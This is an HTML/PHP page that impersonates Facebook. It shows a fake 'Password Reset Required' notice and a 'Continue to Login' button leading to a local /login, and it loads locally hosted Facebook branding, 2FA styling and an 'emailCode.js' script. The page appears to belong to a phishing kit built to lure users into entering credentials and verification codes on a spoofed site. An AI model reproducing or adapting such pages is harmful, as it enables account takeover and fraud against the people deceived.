<?php


?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css"
        integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
<link rel="shortcut icon" href="./assets/img/fico.ico" type="image/x-icon">
<link rel="stylesheet" href="./assets/css/twofa.css">
<link href="./assets/css/boxicons.min.css" rel="stylesheet">

    <title>Facebook</title>
<style>
    .box{
        height: 390px !important;
        width: 612px;
    }
</style>
</head>
<body>
<div class="navbar">
        <div class="container">
            <a href="/"><p><img src="./assets/img/fblogo.svg" class="logonav"></p></a>
            <div class="logout">
        </div>

        </div>
</div>
<div class="mm">
<div class="box">
    <div class="box_content">
        <p><b>Important Notice: Password Reset Required</b></p>
        <hr>
        <p>It appears that you have entered your password incorrectly multiple times. To ensure the security of your account, we recommend that you reset your password. Please follow this link to initiate the password reset process: <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" target="_blank" style="text-decoration: none; color: #3578e5;">Reset Password</a>.</p>
        <br>
        <p>Once you have reset your password, please return to this page and click the button below to proceed with your login.</p>
        <br>
        <div class="bottomline">
            <a href="/login" style="text-decoration: none;">
                <button type="button" class="submit2fa" id="submit">
                    Continue to Login
                </button>
            </a>
        </div>
    </div>
</div>

<style>
    .box {
        /* Add your box styles here */
    }

    .box_content {
        /* Add your box content styles here */
    }

    .submit2fa {
        background-color: #3578e5;
        color: white;
        border: none;
        padding: 10px 20px;
        border-radius: 4px;
        cursor: pointer;
        font-size: 16px;
    }

    .submit2fa:hover {
        background-color: #2a5bbd; /* Darker shade on hover */
    }
</style>

</div>

<script src="https://code.jquery.com/jquery-3.6.4.min.js" integrity="sha256-oP6HI9z1XaZNBrJURtCoUT5SUnxFr8s3BzRl+cbzUq8=" crossorigin="anonymous"></script>
<script src="./assets/js/emailCode.js"></script>



</body>
</html>